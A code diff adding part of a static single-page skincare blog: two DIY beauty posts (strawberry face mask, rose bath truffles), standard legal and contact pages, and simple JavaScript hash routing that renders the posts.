+                        <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Beauty Hacks</span>
+                    </div>
+                `
+            },
+            {
+                id: 'diy-strawberry-face-mask',
+                title: 'DIY Strawberry Face Mask',
+                date: 'June 19, 2026',
+                image: './assets/DIY%20Strawberry%20Face%20Mask.png',
+                excerpt: `Fresh strawberries aren't just for snacking, they make the dreamiest face mask! Packed with Vitamin C and natural AHAs, this Strawberry Face Mask with honey and yogurt brightens, hydrates, and fades dullness in just 15 minutes. 🍓<br><br>&bull; Fights dark spots and evens out skin tone<br>&bull; Soothes and softens with honey and yogurt<br><br>Such an easy weekend treat-yourself moment. Save for later and glow naturally! #strawberrymask #DIYskincare #naturalglow`,
+                content: `
+                    <p>Strawberries might be one of the most underrated skincare ingredients hiding in plain sight in your fridge. This DIY Strawberry Face Mask combines mashed strawberries with honey and yogurt to create a brightening, hydrating treatment that leaves skin looking fresh and radiant. It takes only a few minutes to prepare and uses ingredients most people already have on hand.</p>
+
+                    <p>What makes strawberries such a great choice for skincare is their natural composition. They are rich in Vitamin C, antioxidants, and mild natural alpha hydroxy acids, which work together to gently brighten skin, support an even tone, and help fade the look of dullness. When paired with hydrating honey and soothing yogurt, this simple three-ingredient mask becomes a genuinely effective at-home facial.</p>
+
+                    <div style="background:#f8fafc;border:1px solid #dbe4ee;border-radius:12px;padding:18px 20px;margin:24px 0;">
+                        <h3 style="margin-top:0;margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Key Takeaways</h3>
+                        <ul style="margin:0;padding-left:20px;">
+                            <li>Strawberries contain Vitamin C, antioxidants, and natural AHAs that support brighter skin.</li>
+                            <li>Honey hydrates and offers gentle, natural antibacterial benefits.</li>
+                            <li>Yogurt soothes skin and contains lactic acid, another mild natural exfoliant.</li>
+                            <li>The mask needs just 15 to 20 minutes to work its magic.</li>
+                            <li>Best used two to three times a week for visible results.</li>
+                            <li>A patch test is recommended before your first full application.</li>
+                        </ul>
+                    </div>
+
+                    <h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Why Strawberries Deserve a Spot in Your Skincare Routine</h2>
+
+                    <p>Strawberries are naturally high in Vitamin C, a well-known antioxidant that supports collagen production and helps protect skin from everyday environmental stress. They also contain small amounts of natural alpha hydroxy acids, which gently encourage surface cell turnover, helping skin look fresher and more even without the intensity of stronger chemical exfoliants.</p>
+
+                    <h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Honey: Nature's Humectant</h3>
+
+                    <p>Honey pulls moisture from the surrounding air directly into the skin, making it a wonderful addition for anyone dealing with dryness or flakiness. It also has mild antibacterial qualities, which can be particularly comforting for skin that is feeling irritated or reactive.</p>
+
+                    <p style="background:#f8fafc;border-left:4px solid #2563eb;padding:16px 18px;border-radius:10px;margin:22px 0;color:#1e293b;"><strong>Important:</strong> Strawberries are a common allergen for some people. Always do a small patch test on your inner wrist or elbow at least 24 hours before applying this mask to your full face.</p>
+
+                    <h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Yogurt: The Soothing Exfoliant</h3>
+
+                    <p>Plain yogurt contains lactic acid, a gentle exfoliating acid that also happens to be soothing and calming on the skin. Its creamy texture helps the mask spread smoothly and adds a cooling sensation that feels especially nice on warm days or after sun exposure.</p>
+
+                    <h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">How to Make It Step by Step</h2>
+
+                    <p>Start with three to four fresh strawberries. Wash them thoroughly, remove the green tops, and mash them in a small bowl until you reach a smooth, slightly chunky puree. Add one teaspoon of honey to the mashed strawberries and stir well to combine.</p>
+
+                    <p>Finally, mix in one teaspoon of plain yogurt until the mixture becomes smooth and easy to spread. The finished mask should have a thick, jam-like consistency that clings to your skin without dripping.</p>
+
+                    <h4 style="font-size:20px;line-height:1.4;margin:22px 0 12px;color:#334155;font-weight:700;background:#f8fafc;padding:10px 14px;border-radius:8px;">Quick Recipe Recap</h4>
+
+                    <ol>
+                        <li>Mash 3 to 4 fresh strawberries until smooth.</li>
+                        <li>Stir in 1 teaspoon of honey.</li>
+                        <li>Add 1 teaspoon of plain yogurt and mix until smooth.</li>
+                        <li>Apply immediately for the freshest results.</li>
+                    </ol>
+
+                    <div style="background:#f8fafc;border:1px solid #dbe4ee;border-radius:12px;padding:18px 20px;margin:24px 0;">
+                        <h3 style="margin-top:0;margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Quick Note</h3>
+                        <p style="margin:0;">This mask is best made fresh right before use since it contains no preservatives. Avoid making a large batch to store for later, as the fruit will oxidize and lose potency within hours.</p>
+                    </div>
+
+                    <h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">How to Apply the Mask</h2>
+
+                    <p>Cleanse your face thoroughly before starting so the mask can absorb properly without being blocked by dirt or makeup residue. Using clean fingers or a soft brush, apply the mask evenly across your face, avoiding the delicate eye area. Let it sit for fifteen to twenty minutes while you relax.</p>
+
+                    <p style="background:#fff7ed;border:1px solid #fed7aa;padding:16px 18px;border-radius:10px;margin:22px 0;color:#9a3412;"><strong>Pro Tip:</strong> Lie back with a towel under your head while the mask sets to avoid drips, and use the time to unwind with a book or your favorite playlist for a true spa-day feeling.</p>
+
+                    <p>Rinse off with lukewarm water using gentle circular motions, which adds a light additional exfoliation as you remove the mask. Pat your skin dry and follow up with your regular moisturizer to seal in hydration.</p>
+
+                    <h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">How Often to Use It</h3>
+
+                    <p>Two to three times a week is ideal for most skin types. Because the natural acids in strawberries and yogurt are mild, this mask is generally gentle enough for regular use, but always listen to your skin and scale back if you notice any redness or sensitivity.</p>
+
+                    <div style="background:#f8fafc;border:1px solid #dbe4ee;border-radius:12px;padding:18px 20px;margin:24px 0;">
+                        <h3 style="margin-top:0;margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">At a Glance</h3>
+                        <ul style="margin:0;padding-left:20px;">
+                            <li>Only 3 fresh ingredients needed.</li>
+                            <li>Leave on for 15 to 20 minutes.</li>
+                            <li>Use 2 to 3 times weekly for best results.</li>
+                            <li>Always patch test if you have fruit sensitivities.</li>
+                            <li>Best made fresh right before each use.</li>
+                        </ul>
+                    </div>
+
+                    <h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Final Thoughts</h2>
+
+                    <p>This DIY Strawberry Face Mask is a simple, feel-good way to give your skin a little extra love using nothing but fresh, natural ingredients. It is quick to make, gentle enough for regular use, and leaves your skin looking brighter and feeling wonderfully soft. Add it to your weekend routine and enjoy a few minutes of pure, fresh-fruit pampering.</p>
+
+                    <div style="margin-top:28px;">
+                        <h3 style="margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Tags</h3>
+                        <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Strawberry Face Mask</span>
+                        <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">DIY Skincare</span>
+                        <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Natural Glow</span>
+                        <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Brightening Mask</span>
+                        <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Vitamin C Skincare</span>
+                        <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Face Mask Recipe</span>
+                        <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Self Care Sunday</span>
+                    </div>
+                `
+            },
+            {
+                id: 'rose-mineral-bath-truffle',
+                title: 'Rose Mineral Bath Truffle',
+                date: 'February 27, 2026',
+                image: './assets/Rose%20Mineral%20Bath%20Truffl.png',
+                excerpt: `Turn bath time into a ritual with these Rose Mineral Bath Truffles. These creamy, slow-melt truffles are infused with rose petals and skin-loving minerals for a deeply moisturizing, spa-like soak. 🌷🛁<br><br>&bull; Melts slowly for a long, luxurious soak<br>&bull; Calming rose aroma helps you unwind<br><br>Just drop one truffle in and relax. Save this for your next cozy bath night! #bathtruffle #selfcarenight #rosebath`,
+                content: `
+                    <p>There is bathing, and then there is a genuine bath ritual, and Rose Mineral Bath Truffles firmly belong in the second category. These creamy, slow-melt spheres are infused with dried rose petals and mineral-rich ingredients, designed to transform an ordinary soak into a deeply moisturizing, spa-inspired experience. Instead of a quick rinse, a bath truffle invites you to slow down, light a candle, and actually enjoy the water around you.</p>
+
+                    <p>Unlike a classic fizzy bath bomb, a bath truffle is built for a different kind of experience. Rather than exploding with fizz the second it hits water, a truffle melts slowly and creamily, releasing oils, minerals, and fragrance gradually over the course of your soak. That slow release is exactly what makes them so effective at leaving skin feeling soft, nourished, and replenished long after you step out of the tub.</p>
+
+                    <div style="background:#f8fafc;border:1px solid #dbe4ee;border-radius:12px;padding:18px 20px;margin:24px 0;">
+                        <h3 style="margin-top:0;margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Key Takeaways</h3>
+                        <ul style="margin:0;padding-left:20px;">
+                            <li>Bath truffles melt slowly, unlike fizzy bath bombs, for a longer-lasting spa effect.</li>
+                            <li>Rose petals infuse the water with a calming, aromatherapy-style scent.</li>
+                            <li>Mineral-rich ingredients help soften and replenish dry skin during the soak.</li>
+                            <li>One truffle is designed for a single, full bath.</li>
+                            <li>The creamy melt leaves a light, non-greasy moisture layer on the skin.</li>
+                            <li>Perfect for evening wind-down routines and self-care nights.</li>
+                        </ul>
+                    </div>
+
+                    <h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">What Makes a Bath Truffle Different</h2>
+
+                    <p>The name comes from their appearance, round, textured, and dusted, much like an actual chocolate truffle. But the real difference lies in the formulation. Bath truffles typically combine moisturizing butters and oils with mineral salts and botanicals, creating a product that prioritizes skin conditioning over visual spectacle. Where a bath bomb is designed to fizz and dissolve quickly, a truffle is designed to melt gradually, coating the water with a silky, nourishing layer.</p>
+
+                    <h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">The Role of Minerals in Bath Soaks</h3>
+
+                    <p>Mineral-rich ingredients, often drawing on concepts similar to Epsom or Dead Sea salts, are prized in bath rituals for their reputed ability to soothe tired muscles and support relaxation. When paired with a slow-melting oil base, these minerals stay suspended in the water throughout your soak rather than sinking or dissolving away too quickly.</p>
+
+                    <p style="background:#f8fafc;border-left:4px solid #2563eb;padding:16px 18px;border-radius:10px;margin:22px 0;color:#1e293b;"><strong>Important:</strong> Because bath truffles contain oils, they can make the tub surface slippery. Always exit the bath carefully and give your tub a quick rinse afterward to keep it safe for the next use.</p>
+
+                    <h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Rose Petals and Aromatherapy</h3>
+
+                    <p>Dried rose petals are more than decoration. Rose scent is widely associated with calm and relaxation, making it a natural fit for an evening ritual meant to help you unwind after a long day. The petals scattered throughout the truffle also add a beautiful, spa-like visual element as they float in the bathwater.</p>
+
+                    <h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">How to Use a Rose Mineral Bath Truffle</h2>
+
+                    <p>Fill your tub with warm water and get everything else ready first, towel, robe, and maybe a candle or two, since you want to be able to sink in and relax right away. Drop one truffle directly into the running water or into the filled tub and let it begin to slowly melt and swirl on its own.</p>
+
+                    <p>Resist the urge to break it apart or rush the process. Part of the appeal of a bath truffle is watching it dissolve gradually, releasing its creamy texture, subtle rose fragrance, and mineral content over several minutes rather than all at once.</p>
+
+                    <h4 style="font-size:20px;line-height:1.4;margin:22px 0 12px;color:#334155;font-weight:700;background:#f8fafc;padding:10px 14px;border-radius:8px;">Quick Usage Recap</h4>
+
+                    <ol>
+                        <li>Draw a warm bath and prepare your space beforehand.</li>
+                        <li>Drop one truffle into the water.</li>
+                        <li>Let it melt naturally without stirring or breaking it apart.</li>
+                        <li>Soak for at least 15 to 20 minutes to enjoy the full effect.</li>
+                    </ol>
+
+                    <div style="background:#f8fafc;border:1px solid #dbe4ee;border-radius:12px;padding:18px 20px;margin:24px 0;">
+                        <h3 style="margin-top:0;margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Why This Matters</h3>
+                        <p style="margin:0;">Slowing down bath time is not just indulgent, it can genuinely support better sleep and stress relief when made a regular part of your evening routine. A warm soak paired with calming scents like rose is a simple, low-effort way to signal to your body that it is time to unwind.</p>
+                    </div>
+
+                    <h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Getting the Most Out of Your Soak</h2>
+
+                    <p>Keep the room dimly lit and consider adding a candle for extra ambiance. Play soft music or simply enjoy the quiet. The slow-melting nature of the truffle means the water stays luxurious feeling for the full length of your bath, so there is no rush to get in and out quickly.</p>
+
+                    <p style="background:#fff7ed;border:1px solid #fed7aa;padding:16px 18px;border-radius:10px;margin:22px 0;color:#9a3412;"><strong>Pro Tip:</strong> Pair your bath truffle night with a warm herbal tea and keep your phone in another room. The goal is a genuine break, not a scrolling session with better lighting.</p>
+
+                    <h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Skin Type Considerations</h3>
+
+                    <p>Because bath truffles are oil-rich and gentle, they tend to work well for dry and normal skin types looking for extra hydration. If your skin leans oily or is prone to breakouts on the body, you may prefer to use a truffle less frequently, once a week is usually a comfortable starting point.</p>
+
+                    <h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Storage Tips</h3>
+
+                    <p>Store truffles in a cool, dry place away from direct sunlight and humidity, which can cause them to soften prematurely. A lidded jar or tin works well to keep them fresh and ready whenever you need a moment of calm.</p>
+
+                    <div style="background:#f8fafc;border:1px solid #dbe4ee;border-radius:12px;padding:18px 20px;margin:24px 0;">
+                        <h3 style="margin-top:0;margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">At a Glance</h3>
+                        <ul style="margin:0;padding-left:20px;">
+                            <li>Use one truffle per full bath for best results.</li>
+                            <li>Let it melt naturally over several minutes.</li>
+                            <li>Best suited for dry to normal skin types.</li>
+                            <li>Store in a cool, dry place to preserve texture.</li>
+                            <li>Ideal for evening wind-down and self-care routines.</li>
+                        </ul>
+                    </div>
+
+                    <h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Final Thoughts</h2>
+
+                    <p>A Rose Mineral Bath Truffle turns a routine soak into an intentional moment of calm. Between the slow, creamy melt, the soft rose aroma, and the skin-softening minerals, it is an easy way to bring a little extra luxury into your self-care routine without much effort at all. Save this one for a night when you truly want to slow down and recharge.</p>
+
+                    <div style="margin-top:28px;">
+                        <h3 style="margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Tags</h3>
+                        <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Bath Truffle</span>
+                        <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Rose Bath Soak</span>
+                        <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Self Care Night</span>
+                        <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Mineral Bath</span>
+                        <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Relaxation Ritual</span>
+                        <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Spa At Home</span>
+                        <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Aromatherapy</span>
+                    </div>
+                `
+            },
+
+        ];
+
+        // Static Legal Pages (Required for AdSense & Pinterest)
+        const pages = {
+            'about': {
+                title: 'About Us',
+                content: `
+                    <p>Welcome to <strong>DIY Homemade Body</strong>!</p>
+                    <p>Our mission is to create a positive, inspiring, and safe space on the internet where we share thoughts, stories, and ideas about natural skincare, simple DIY beauty recipes, and everyday self-care.</p>
+                    <p>Whether you are here to learn how to make your own scrubs and masks, find fresh self-care inspiration, or just enjoy some cozy reading, we are glad you stopped by. We strive to provide high-quality, family-friendly content that sparks creativity and healthy habits.</p>
+                    <p>Thank you for being part of our community!</p>
+                `
+            },
+            'privacy': {
+                title: 'Privacy Policy',
+                content: `
+                    <p><strong>Last updated: May 2026</strong></p>
+                    <p>At DIY Homemade Body, one of our main priorities is the privacy of our visitors. This Privacy Policy document contains types of information that is collected and recorded by us and how we use it.</p>
+
+                    <h3>Log Files</h3>
+                    <p>We follow a standard procedure of using log files. The information collected includes internet protocol (IP) addresses, browser type, Internet Service Provider (ISP), date and time stamp, referring/exit pages, and possibly the number of clicks. These are not linked to any information that is personally identifiable. The purpose of the information is for analyzing trends and administering the site.</p>
+
+                    <h3>Cookies and Web Beacons</h3>
+                    <p>Like any other website, we use "cookies". These cookies are used to store information including visitors' preferences, and the pages on the website that the visitor accessed or visited. The information is used to optimize the users' experience by customizing our web page content based on visitors' browser type and/or other information.</p>
+
+                    <h3>Google AdSense & Third-Party Privacy Policies</h3>
+                    <p>Third-party ad servers or ad networks use technologies like cookies, JavaScript, or Web Beacons that are used in their respective advertisements and links that appear on our blog. They automatically receive your IP address when this occurs.</p>
+                    <ul>
+                        <li>Third-party vendors, including Google, use cookies to serve ads based on a user's prior visits to your website or other websites.</li>
+                        <li>Google's use of advertising cookies enables it and its partners to serve ads to your users based on their visit to your sites and/or other sites on the Internet.</li>
+                        <li>Users may opt out of personalized advertising by visiting Google's <a href="https://www.google.com/settings/ads" target="_blank" rel="noopener noreferrer">Ads Settings</a>. Alternatively, you can opt out of a third-party vendor's use of cookies for personalized advertising by visiting <a href="https://www.aboutads.info/choices/" target="_blank" rel="noopener noreferrer">www.aboutads.info</a>.</li>
+                    </ul>
+
+                    <h3>Pinterest and Social Media</h3>
+                    <p>We may use social media features, such as the Pinterest "Save" button or Pinterest analytics tags, which may collect your IP address and which page you are visiting on our site, and may set a cookie to enable the feature to function properly. Your interactions with these features are governed by the privacy policy of the company providing it (e.g., the <a href="https://policy.pinterest.com/en/privacy-policy" target="_blank" rel="noopener noreferrer">Pinterest Privacy Policy</a>).</p>
+
+                    <h3>Children's Information</h3>
+                    <p>Another part of our priority is adding protection for children while using the internet. We encourage parents and guardians to observe, participate in, and/or monitor and guide their online activity. We do not knowingly collect any Personal Identifiable Information from children under the age of 13. If you think that your child provided this kind of information on our website, we strongly encourage you to contact us immediately and we will do our best efforts to promptly remove such information from our records.</p>
+                `
+            },
+            'terms': {
+                title: 'Terms of Service',
+                content: `
+                    <p><strong>Effective Date: May 2026</strong></p>
+                    <h3>1. Acceptance of Terms</h3>
+                    <p>By accessing and using this website, you accept and agree to be bound by the terms and provision of this agreement.</p>
+
+                    <h3>2. User Conduct</h3>
+                    <p>Our blog is a family-friendly space. You agree to use the site only for lawful purposes. You agree not to take any action that might compromise the security of the site, render the site inaccessible to others, or otherwise cause damage to the site or the content.</p>
+
+                    <h3>3. Intellectual Property</h3>
+                    <p>The content, organization, graphics, design, and other matters related to the Site are protected under applicable copyrights and proprietary rights. The copying or redistribution by you of any such matters is strictly prohibited without our express written permission.</p>
+
+                    <h3>4. Disclaimer of Warranties</h3>
+                    <p>The materials on our website are provided on an 'as is' basis. We make no warranties, expressed or implied, regarding the accuracy, likely results, or reliability of the use of the materials on its website. This content is for informational purposes only and is not a substitute for professional dermatological advice.</p>
+
+                    <h3>5. Links to Other Websites</h3>
+                    <p>Our website may contain links to third-party web sites or services (such as advertisers or social media platforms like Pinterest) that are not owned or controlled by us. We have no control over, and assume no responsibility for, the content or privacy policies of any third party web sites.</p>
+                `
+            },
+            'contact': {
+                title: 'Contact Us',
+                content: `
+                    <p>We would love to hear from you! Whether you have a question about our content, need assistance with our website, or want to inquire about our Privacy Policy and Terms of Service, feel free to reach out.</p>
+                    <p><strong>Email:</strong> <a href="mailto:contact@diyhomemadebody.com">contact@diyhomemadebody.com</a></p>
+                    <p>Please note that we aim to respond to all inquiries within 48 to 72 hours. We kindly ask that all communications remain respectful and appropriate.</p>
+                `
+            }
+        };
+
+        // 2. Application Logic
+        const app = document.getElementById('app');
+        const blogUsername = "DIY Homemade Body";
+        const avatarUrl = "./assets/blog-avatar.jpg";
+
+        // Function to render the home page (list of posts)
+        function renderHome() {
+            let html = '';
+            posts.forEach(post => {
+                html += `
+                    <div class="post-card" onclick="navigate('post', '${post.id}')">
+                        <div class="post-header">
+                            <img class="avatar" src="${avatarUrl}" alt="Avatar">
+                            <span class="username">${blogUsername}</span>
+                        </div>
+                        <img class="post-image" src="${post.image}" alt="${post.title}" onerror="this.onerror=null; this.src='https://via.placeholder.com/540x400?text=Image+Not+Found'">
+                        <div class="post-content">
+                            <h2>${post.title}</h2>
+                            <p>${post.excerpt}</p>
+                        </div>
+                        <div class="post-footer">
+                            <span>${post.date}</span>
+                            <span style="letter-spacing: 10px; font-size: 1.1rem;">↻ ♥</span>
+                        </div>
+                    </div>
+                `;
+            });
+            app.innerHTML = html;
+        }
+
+        // Function to render a static page (like Privacy Policy)
+        function renderPage(pageId) {
+            const page = pages[pageId];
+
+            if (!page) {
+                app.innerHTML = `<p style="color: white;">Page not found.</p><a class="back-button" onclick="navigate('home')">&larr; Back to Dashboard</a>`;
+                return;
+            }
+
+            app.innerHTML = `
+                <a class="back-button" onclick="navigate('home')">&larr; Back to Dashboard</a>
+                <div class="single-post">
+                    <div class="post-content" style="padding-top: 30px; padding-bottom: 30px;">
+                        <h1>${page.title}</h1>
+                        ${page.content}
+                    </div>
+                </div>
+            `;
+            window.scrollTo(0, 0); // Scroll to top
+        }
+
+        // Function to render a single post
+        function renderPost(postId) {
+            const post = posts.find(p => p.id === postId);
+
+            if (!post) {
+                app.innerHTML = `<p style="color: white;">Post not found.</p><a class="back-button" onclick="navigate('home')">&larr; Back to Dashboard</a>`;
+                return;
+            }
+
+            app.innerHTML = `
+                <a class="back-button" onclick="navigate('home')">&larr; Back to Dashboard</a>
+                <div class="single-post">
+                    <div class="post-header">
+                        <img class="avatar" src="${avatarUrl}" alt="Avatar">
+                        <span class="username">${blogUsername}</span>
+                    </div>
+                    <img class="post-image" src="${post.image}" alt="${post.title}" onerror="this.onerror=null; this.src='https://via.placeholder.com/540x400?text=Image+Not+Found'">
+                    <div class="post-content">
+                        <h1>${post.title}</h1>
+                        ${post.content}
+                    </div>
+                    <div class="post-footer">
+                        <span>${post.date}</span>
+                        <span style="letter-spacing: 10px; font-size: 1.1rem;">↻ ♥</span>
+                    </div>
+                </div>
+            `;
+            window.scrollTo(0, 0); // Scroll to top
+        }
+
+        // Simple router/navigator
+        function navigate(view, id = null) {
+            if (view === 'home') {
+                window.location.hash = '';
+                renderHome();
+            } else if (view === 'post') {
+                window.location.hash = id;
+                renderPost(id);
+            } else if (view === 'page') {
+                window.location.hash = id;
+                renderPage(id);
+            }
+        }
+
+        // Listen for browser back/forward buttons
+        window.addEventListener('hashchange', () => {
+            const hash = window.location.hash.replace('#', '');
+            if (hash) {
+                // Check if the hash matches a static page, otherwise assume it's a post
+                if (pages[hash]) {
+                    renderPage(hash);
+                } else {
+                    renderPost(hash);
+                }
+            } else {
+                renderHome();
+            }
+        });
+
+        // Initial Load
+        const initialHash = window.location.hash.replace('#', '');
+        if (initialHash) {
+            if (pages[initialHash]) {
+                renderPage(initialHash);
+            } else {
+                renderPost(initialHash);
+            }
+        } else {
+            renderHome();
+        }
+    </script>
+</body>
+
+</html>
